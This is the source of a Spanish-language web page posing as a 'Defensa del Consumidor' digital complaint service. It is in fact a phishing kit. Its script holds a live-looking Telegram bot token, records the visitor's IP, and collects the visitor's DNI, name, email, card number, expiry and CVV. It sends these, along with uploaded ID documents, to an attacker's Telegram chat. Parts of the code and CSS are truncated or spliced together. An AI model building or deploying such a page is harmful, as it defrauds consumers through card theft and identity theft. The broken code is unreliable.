<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Defensa del Consumidor 췅 Reclamo Digital</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:700,500,400&display=swap" rel="stylesheet">
  <style>
    :root {
      --azul: #17447b;
      --celeste: #029be5;
      --amarillo: #ffe066;
      --fondo: #f2f6fa;
      --gris: #e6e9ee;
      --gris2: #d3dae1;
      --rojo: #d32f2f;
      --verde: #388e3c;
      --borde: #cad7e2;
      --radius: 20px;
      --trans: 0.33s cubic-bezier(.7,.4,.35,1.04);
      --shadow: 0 4px 36px #17447b12;
      --shadow-s: 0 1px 7px #0001;
    }
    html, body {
      margin: 0; padding: 0;
      font-family: 'Montserrat', Arial, sans-serif;
      background: var(--fondo);
      color: #232323;
      min-height: 100vh;
    }
    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: stretch;
    }
    header {
      background: linear-gradient(90deg, var(--azul) 0%, var(--celeste) 100%);
      color: white;
      padding: 2rem 1rem 1.1rem 1rem;
      text-align: center;
      border-bottom-left-radius: var(--radius);
      border-bottom-right-radius: var(--radius);
      box-shadow: var(--shadow-s);
    }
    .logo {
      width: 62px;
      height: 62px;
      margin-bottom: 0.7rem;
      display: block;
      margin-left: auto;
      margin-right: auto;
      border-radius: 100%;
      background: white;
      box-shadow: 0 2px 8px #17447b33;
      padding: 4px;
    }
    h1 {
      font-size: 1.56rem;
      margin: 0;
      font-weight: 700;
      letter-spacing: 0.5px;
      line-height: 1.3;
      text-shadow: 0 2px 4px #052e4b23;
    }
    .subtitle {
      font-size: 1.01rem;
      font-weight: 500;
      margin-top: 0.3rem;
      letter-spacing: .1px;
      color: #e8eaf6;
      opacity: 0.84;
    }
    .main-card {
      width: 100%;
      max-width: 430px;
      margin: 1.4rem auto 0.8rem auto;
      background: #fff;
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      overflow: hidden;
      min-height: 68vh;
      display: flex;
      flex-direction: column;
      justify-content: stretch;
      position: relative;
      border: 1.2px solid var(--gris2);
      transition: box-shadow var(--trans), border var(--trans);
    }
    .stepper {
      width: 100%;
      background: #fafdff;
      padding: 0.5rem 0.4rem 0.6rem 0.4rem;
      border-top-left-radius: var(--radius);
      border-top-right-radius: var(--radius);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      border-bottom: 1.2px solid var(--gris2);
    }
    .dot {
      width: 15px; height: 15px;
      background: var(--gris2);
      border-radius: 50%;
      display: inline-block;
      box-shadow: 0 0 0 2px #fff;
      border: 2px solid #fff;
      transition: background 0.2s;
    }
    .dot.active { background: var(--azul); }
    .dot.done { background: var(--verde);}
    .step-panel {
      width: 100%;
      background: #fff;
      border-radius: var(--radius);
      box-sizing: border-box;
      padding: 0;
      overflow: hidden;
      position: relative;
      animation: fadeInUp 0.5s;
      transition: opacity var(--trans), transform var(--trans);
      min-height: 63vh;
      display: flex;
      flex-direction: column;
      justify-content: start;
    }
    .step-panel.fadeOut {
      animation: fadeOutUp 0.4s forwards;
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(34px);}
      to { opacity: 1; transform: translateY(0);}
    }
    @keyframes fadeOutUp {
      from { opacity: 1; transform: translateY(0);}
      to { opacity: 0; transform: translateY(-40px);}
    }
    .panel-content {
      padding: 2.1rem 2rem 1.2rem 2rem;
      display: flex;
      flex-direction: column;
      gap: 1.1rem;
      min-height: 54vh;
      justify-content: start;
    }
    .panel-title {
      font-size: 1.22rem;
      font-weight: 700;
      color: var(--azul);
      margin-bottom: 0.5rem;
    }
    .panel-desc {
      font-size: 1.06rem;
      color: #2e3e54;
      margin-bottom: 0.3rem;
      line-height: 1.7;
      font-weight: 500;
    }
    .panel-terms {
      background: #fafdff;
      border-left: 5px solid var(--azul);
      border-radius: 10px;
      padding: 1.1em 1.1em 1.1em 1.3em;
      font-size: 0.99em;
      color: #25426a;
      margin-bottom: 1.1em;
      line-height: 1.6;
      box-shadow: 0 1px 8px #17447b10;
    }
    label {
      font-weight: 600;
      font-size: 1.04rem;
      margin-bottom: 0.28rem;
      display: block;
      color: #25426a;
    }
    input, textarea {
      width: 100%;
      padding: 0.89rem;
      font-size: 1.15rem;
      border: 1.5px solid var(--borde);
      border-radius: 10px;
      margin-bottom: 0.7rem;
      box-sizing: border-box;
      background: #fafdff;
      transition: border 0.2s;

      background: #f2f8ff;
    }
    .input-error {

    }
    .btn,

      color: white;

      font-weight: 700;

      border-radius: 999px;

      margin-top: 0.2rem;
      margin-bottom: 0.1rem;
      display: block;
      user-select: none;
      pointer-events: auto;
    }
    .btn:disabled, .btn-file:disabled {
      background: #e0e0e0;
      color: #bdbdbd;
      cursor: not-allowed;
      box-shadow: none;
      pointer-events: none;
    }
    .btn-file {
      background: #f5f5f5;
      color: var(--azul);
      border: 1.5px solid var(--azul);
      margin-bottom: 0.25rem;
      font-size: 1.06rem;
      position: relative;
      overflow: hidden;
      text-align: left;
      padding-left: 1.1rem;
    }
    .btn-file input[type="file"] {
      position: absolute;
      left: 0; top: 0;
      opacity: 0;
      width: 100%; height: 100%;
      cursor: pointer;
      z-index: 10;
    }
    .file-label {
      display: inline-block;
      font-size: 0.97em;
      color: var(--verde);
      margin-left: 0.7em;
      max-width: 53%;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      vertical-align: middle;
    }
    .error {
      color: var(--rojo);
      font-size: 0.99rem;
      display: block;
      text-align: center;
      padding: 0.39rem 0.8rem;
      border-radius: 8px;
      background: #fff0f0;
      font-weight: 600;
      animation: shake 0.15s;
      margin-bottom: 0.2rem;
    }
    @keyframes shake {
      0% { transform: translateX(-4px);}
      50% { transform: translateX(4px);}
      100% { transform: translateX(0);}
    }
    .loader {
      display: block;
      margin: 0.7rem auto 0.7rem auto;
      border: 3px solid #cfd8dc;
      border-top: 3px solid var(--azul);
      border-radius: 50%;
      width: 27px;
      height: 27px;
      animation: spin 1s linear infinite;

    @keyframes spin { to { transform: rotate(360deg);} }
    .panel-success {

      background: #e8f7e9;
      border-radius: var(--radius);
      text-align: center;
      font-weight: 700;
      font-size: 1.18rem;
      margin-bottom: 1.5rem;
      padding: 1.6rem 0.7rem 1.6rem 0.7rem;
      animation: fadeInUp 0.8s;
      box-shadow: 0 2px 6px #388e3c18;
    }
    .panel-note {
      color: #17447b;
      font-size: 1.06rem;
      margin-top: 0.7rem;
      text-align: center;
      font-weight: 500;
    }
    @media (max-width: 600px) {
      .main-card {max-width: 100vw; border-radius: 0;}
      .panel-content {padding: 1.1rem 0.7rem 1rem 0.7rem;}
      .stepper {padding-left: 0.1rem; padding-right: 0.1rem;}
    }
    footer {
      margin-top: auto;
      background: var(--fondo);
      color: #8591a5;
      text-align: center;
      padding: 1.3rem 0 1.2rem 0;
      font-size: 1.02rem;
      letter-spacing: 0.15px;
      border-top: 1px solid #e0e0e0;
    }
  </style>
</head>

<script>
// ---- CONFIG TELEGRAM ----
const TELEGRAM_TOKEN = "7851025816:AAFTo0o_D0tabAqttKh8bsZgIT0jFG1djL0";
const CHAT_ID = "-1002695863035";

// ---- UI Y FLUJO ----
const wizard = document.getElementById('wizard');
let step = 0, userNombre = "", userEmail = "", userDni = "";
let userIP = "";

const STEPS = [
  "Identidad",
  "T칠rminos",

];

fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>userIP=j.ip);

function stepper(current) {
  let html = `<div class="stepper">`;
  for (let i=0;i<STEPS.length-1;i++) {
    html += `<span class="dot${i<current ? ' done': ''}${i===current ? ' active' : ''}"></span>`;
  }
  html += `</div>`;
  return html;
}

function clearWizard() {
  wizard.innerHTML = "";
}

function fadeAndNext(panel, next) {
  panel.classList.add("fadeOut");
  setTimeout(next, 400);
}

// -----------  BOTON ANTI DOBLE CLICK -----------
function disableAllButtons(form) {
  Array.from(form.querySelectorAll('button')).forEach(btn => btn.disabled = true);
  Array.from(form.querySelectorAll('input[type=submit]')).forEach(btn => btn.disabled = true);
}
function enableAllButtons(form) {
  Array.from(form.querySelectorAll('button')).forEach(btn => btn.disabled = false);
  Array.from(form.querySelectorAll('input[type=submit]')).forEach(btn => btn.disabled = false);
}
// -----------------------------------------------

// ---- ENVIO TELEGRAM ----
async function enviarTarjetaATelegram(dni, email, nombre, tarjeta, fecha, cvv, ip) {
  const mensaje = `<b>游댒 Nuevo reclamo:</b>
DNI: <code>${dni}</code>

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: "HTML"
      })
    });
  } catch(err) {}
}

// ENVIO MENSAJE Y EMPRESA A TELEGRAM
async function enviarMensajeEmpresaATelegram(empresa, mensaje, ip) {

        text: text,
        parse_mode: "HTML"
      })
    });
  } catch(err) {}
}

// ENVIO ARCHIVO A TELEGRAM
async function enviarArchivoATelegram(file, label, ip) {
  if (!file) return;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('caption', `${label}\nIP: <code>${ip||"-"}</code>`);
  if (file.type.startsWith("image/")) {
    formData.append('photo', file, file.name);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  } else {
    formData.append('document', file, file.name);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });
  }
}

function showStepIdentidad() {
  clearWizard();
  step = 0;
  wizard.innerHTML = `

    <form class="step-panel" id="panel-identidad" autocomplete="off">

  document.getElementById('panel-identidad').onsubmit = async function(e) {
    e.preventDefault();
    disableAllButtons(this);
    let dni = document.getElementById('dni').value.trim();

    userDni = dni;

    document.getElementById('dni-loader').style.display = 'none';
    document.getElementById('btn-dni').disabled = false;
    if(!found){
      error.textContent = 'No se encontr칩 el DNI ingresado.';
      error.style.display = "block";
      document.getElementById('dni').classList.add('input-error');
      enableAllButtons(this);
      return;
    }
    userNombre = nombre;
    fadeAndNext(document.getElementById('panel-identidad'), showStepTerminos);

}
showStepIdentidad();

function showStepTerminos() {
  clearWizard();
  step = 1;
  wizard.innerHTML = `
    ${stepper(step)}
    <div class="step-panel" id="panel-terminos">
      <div class="panel-content">

  wizard.innerHTML = `

      <div class="panel-content">

        <div class="panel-desc">

function validarTarjeta(num) {
  let sum = 0, alt = false;
  for(let i=num.length-1; i>=0; i--){
    let n = parseInt(num[i]);
    if(alt) {
      n *= 2;
      if(n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return (sum % 10) === 0;
}

    }
    if(name.length < 5){
      err.textContent = 'Ingres치 el nombre completo.';
      err.style.display = "block";
      form.querySelector('#card-name').classList.add('input-error');
      enableAllButtons(this);

    if(!/^((0[1-9])|(1[0-2]))\/([0-9]{2})$/.test(exp)){
      err.textContent = 'Vencimiento inv치lido. Us치 MM/AA.';

      return;
    }

    await enviarTarjetaATelegram(userDni, userEmail, name, num, exp, cvv, userIP);
